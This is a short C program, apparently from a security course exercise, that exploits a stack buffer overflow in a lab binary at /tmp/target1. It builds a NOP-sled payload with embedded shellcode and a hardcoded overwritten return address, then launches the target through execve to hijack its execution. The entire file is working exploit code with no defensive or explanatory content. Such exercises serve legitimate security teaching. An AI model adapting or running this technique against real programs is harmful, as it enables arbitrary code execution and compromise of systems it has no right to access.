#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  const int size = 240 + 4 + 4; // buf size + ebp + ret
  char attack[size];
  memset(attack, 0x90, size);

  char ret[] = "\xd0\xfc\xff\xbf";
  memcpy(attack + (size - 49), shellcode, 45);
  memcpy(attack + (size - 4), ret, 4);
 
  args[0] = TARGET; args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
